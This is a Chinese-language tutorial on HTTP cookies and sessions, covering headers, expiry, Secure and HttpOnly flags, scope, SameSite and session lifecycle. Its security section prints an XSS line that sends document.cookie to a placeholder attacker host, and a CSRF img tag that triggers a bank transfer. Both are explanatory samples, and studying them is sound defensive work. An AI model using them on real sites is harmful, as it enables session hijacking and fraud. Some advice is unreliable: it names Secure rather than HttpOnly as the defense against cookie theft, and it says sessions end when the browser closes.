因为HTTP是无状态的，所以需要一些方式实现保存状态，比如服务端的状态就是返回的状态码，而客户端的状态就用cookie和session，用来记录用户状态：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

## Cookie

- Cookie是由服务端生成的，发送给客户端
- Cookie总是保存在客户端中，按在客户端中的存储位置，可分为：

1. 会话期Cookie`Session cookies`
   保存在客户端内存，浏览器关闭后就自动消失了（会话期内有效），

```
Set-Cookie: yummy_cookie=choco
```

1. 持久性Cookie`Permanent cookies`
   保存在客户端硬盘，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除
   持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age），以秒为单位（设为0是命令浏览器删除该Cookie）
   注意，这个时间是客户端的时间

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

注意，头部的关键字首字母为`大写`

## Cookie的有效期

- Expires（过期时间）
  Cookie到什么时候过期，是一个时间
- Max-Age（有效期）（优先级高）
  Cookie还有多少秒过期

如果同时设置`Expires`和`Max-Age`，那么以后者为标准

## 创建Cookie

1. 服务器向客户端发送response，定义Set-Cookie头，服务器通过该头部告知客户端保存Cookie信息
   注意

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
```

1. 如果客户端没有禁用cookie的话，就会保存cookie
2. 之后每次客户端向服务端发出的请求都会带上cookie

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

## Cookie的Secure 和HttpOnly 标记

- Secure
  带`Secure`的cookie只会在`https`请求的时候放在头里发送给服务端
  注意，因为cookie采用的是明文传输，`Secure`也保证不了它的安全性，可以对cookie再进行一次加密
- HttpOnly
  表示此cookie只应该发送给服务端，而不能在客户端通过js的`Document.cookie`访问（防止`跨域脚本XSS攻击`）

```js
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```



## Cookie的作用域

`Domain`和`Path`标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。

- Domain
  该标识指定了哪些主机`host`可以接受Cookie，不指定默认为`document.location.host`（**不包含子域名**），指定则**包含子域名**：`Domain=github.com`意味着`*.github.com`也生效
- Path
  该标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 `%x2F` ("/") 作为路径分隔符，**子路径也会被匹配**：`Path=/docs`意味着`/docs/*`也生效

## SameSite Cookies

SameSite Cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）

### 第三方Cookie

每个Cookie都会有与之关联的域（Domain）

- 第一方Cookie`first-party cookie`
  Cookie的域和页面的域**相同**
- 第三方Cookie`third-party cookie`
  Cookie的域和页面的域**不相同**

第三方Cookie主要用于***广告和网络追踪***，由于图片之类的可以使用其它网站的图片（跨域），但是如此第一方的Cookie也只会发送给设置它们的服务器，所以需要第三方的组件发送cookie到第三方服务器（大多数浏览器默认都允许第三方Cookie，可以通过浏览器扩展阻止）

## Cookie的缺陷

- Cookie会被附加在每个HTTP请求中，所以无形中增加了流量。
- Cookie的大小限制在4KB左右。对于复杂的存储需求来说是不够用的
- Cookie在HTTP请求中是明文传递的，所以安全性成问题。（除非用HTTPS）

### Cookie安全问题

1. 会话劫持和XSS

```js
(new Image()).src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie
```

应对方式：`Secure`，加密cookie

1. 跨站请求伪造（CSRF）

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

应对方式：

- 对用户输入进行过滤来阻止XSS
- 任何敏感操作都需要确认
- 用于敏感信息的Cookie只能拥有较短的生命周期
- 更多方法可以查看[OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)

## Cookie被客户端禁用了怎么办？

1. 请求头强制指定Cookie（绕过浏览器限制）
2. URL query代替
3. 请求body
   原则就是在HTTP上做手脚，头或体（请求的本质）

## Session

Session代表服务器与浏览器的一次会话过程，这个过程是连续的，也可以时断时续的。为了避免Cookie的种种限制和缺陷，利用Cookie的特性，在服务端也可以实现用户状态的保存

### Session创建的时间

一个常见的误解是以为session在有客户端访问时就被创建，然而事实是直到某server端程序调用 HttpServletRequest.getSession(true)这样的语句时才被创建

### Session删除的时间

1. Session超时：超时指的是连续一定时间服务器没有收到该Session所对应客户端的请求，并且这个时间超过了服务器设置的Session超时的最大时间。
2. 程序调用HttpSession.invalidate()
3. 服务器关闭或服务停止

注意：session会因为浏览器的关闭而删除

## Session和Cookie的关系

因为Session有Session ID的缘故，服务端通过Cookie指定一个唯一的用户标识（一般不指定过期时间，也就是使用的是会话期Cookie），然后在服务端以Session ID为索引，存储任意的用户信息。所以Cookie只是Session实现Session ID的一种方式而已，也可以用其它的方式。

## Cookie和Session的区别

### 作用域

因为Session使用的Cookie没有设置Domain字段和Path，所以不支持子域名和子目录

### 安全性

由于Session保存在服务器，只把Session ID暴露在外面，所以安全性要好于Cookie

### 保存位置（有效期）

Session保存在服务器的内存、硬盘（持久化）、数据库都可以
Cookie保存在客户端的内存或者硬盘

### 服务器压力

Session是保管在服务器端的，每个用户都会产生一个Session。假如并发访问的用户十分多，会产生十分多的Session，耗费大量的内存。而Cookie保管在客户端，不占用服务器资源。假如并发阅读的用户十分多，Cookie是很好的选择。

## 参考

[HTTP cookies - HTTP | MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)
[HTTP State Management Mechanism](https://www.ietf.org/rfc/rfc6265.txt)
[Cookie和Session的作用和工作原理](https://blog.csdn.net/guoweimelon/article/details/50886092)
[深入理解HTTP Session](https://blog.csdn.net/ystyaoshengting/article/details/82690470)